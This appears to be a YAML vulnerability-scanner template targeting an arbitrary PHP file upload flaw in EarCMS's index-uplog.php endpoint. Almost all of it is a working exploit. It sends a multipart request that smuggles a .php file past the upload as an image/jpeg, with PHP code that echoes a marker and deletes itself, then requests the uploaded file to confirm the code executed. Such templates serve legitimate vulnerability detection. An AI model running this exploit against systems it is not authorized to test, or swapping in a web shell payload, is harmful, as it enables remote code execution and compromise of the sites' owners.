name: poc-yaml-earcms-index-uplog-php-file-upload
manual: true
transport: http
set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
    r3: md5(string(r2))
    rboundary: randomLowercase(8)
    randname: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /source/pack/upload/index-uplog.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "\
                ------WebKitFormBoundary{{rboundary}}\r\n\
                Content-Disposition: form-data; name=\"time\"\r\n\

                {{r3}}\r\n\
                ------WebKitFormBoundary{{rboundary}}\r\n\
                Content-Disposition: form-data; name=\"app\"; filename=\"{{randname}}.php\"\r\n\
                Content-Type: image/jpeg\r\n\
                \r\n\
                <?php echo md5({{r1}});unlink(__FILE__);?>\r\n\
                ------WebKitFormBoundary{{rboundary}}--\r\n\
                "
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"php")
    r1:
        request:
            cache: true
            method: GET
            path: /data/tmp/{{r3}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
expression: r0() && r1()
detail:
    author: sharecast
    links:
        - https://zhuanlan.zhihu.com/p/81934322